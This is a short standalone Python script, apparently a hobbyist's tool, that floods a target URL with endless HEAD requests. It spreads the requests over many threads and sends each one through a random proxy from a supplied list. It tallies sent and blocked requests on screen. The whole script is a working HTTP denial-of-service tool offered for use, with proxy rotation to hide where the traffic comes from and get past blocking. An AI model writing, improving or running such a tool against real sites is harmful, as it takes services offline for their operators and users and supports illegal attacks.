#!/usr/bin/python3
# made by uhh (me)
from urllib3 import ProxyManager, make_headers
import urllib, random, time, os, sys
from threading import Thread as th

red = '\033[91m'
green  = '\33[32m'
end = '\033[0m'

if len(sys.argv)<4:
  print(red + "ERROR: Not enough arguments\n" + "Usage: python " + sys.argv[0] + " (url) (threads) (proxy list) (verbose level, can be 1 or 2, optional)" + end)
  exit()

if len(sys.argv)>4:
  verbose = str(sys.argv[4])
  if "0" in verbose:
    pass
  elif "1" in verbose:
    pass
  elif "2" in verbose:
    pass
  else:
    print(red + "ERROR: Wrong verbose value" + end)
    exit()

try:
  threads = int(sys.argv[2])
except:
  print(red + "ERROR: Threads must be a value, setting 10 threads..." + end)
  threads = 10
  time.sleep(1)

proxylist = str(sys.argv[3])
url = str(sys.argv[1])

if threads<1:
    print(red + "ERROR: Thread amount is too low" + end)
    exit()


count = 0
countblocked = 0

proxy = set()

try:
  global proxc
  proxc = 0
  with open(f"{proxylist}", "r") as f:
      file_lines1 = f.readlines()
      for line1 in file_lines1:
          proxy.add(line1.strip())
          proxc += 1
  print(green + str(proxc) + end + " Proxies loaded")
  time.sleep(1)
except:
          print(red + "ERROR: Proxy list not found" + end)
          exit()


def getprox():
  returnprox = random.choice(list(proxy))
  return "http://" + str(returnprox)

def screen():
  global count;global countblocked
  while True:
    print("\nSent: " + green + str(count) + end + "\n" + "Blocked: " + red + str(countblocked) + end)
    time.sleep(1)


def send():
  global count;global countblocked
  if len(sys.argv)>4:
    global verbose
  while True:
    for _ in range(15):
     try:
      http = ProxyManager(getprox())
      r = http.request("HEAD", f"{url}")
      if len(sys.argv)>4:
        if "2" in verbose:
          if str(r.status) == "200":
            print(green + "Status code: " + str(r.status) + end)
          else:
            print(red + "Status code: " + str(r.status) + end)
      count += 1
     except Exception as err:
      countblocked += 1
      if len(sys.argv)>4:
        if "1" in verbose:
          if "Cannot connect to proxy" in str(err):
            print(red + "CRITICAL ERROR: Cannot connect to proxy" + end)


th(target=screen).start()

for _ in range(threads):
  th(target=send).start()
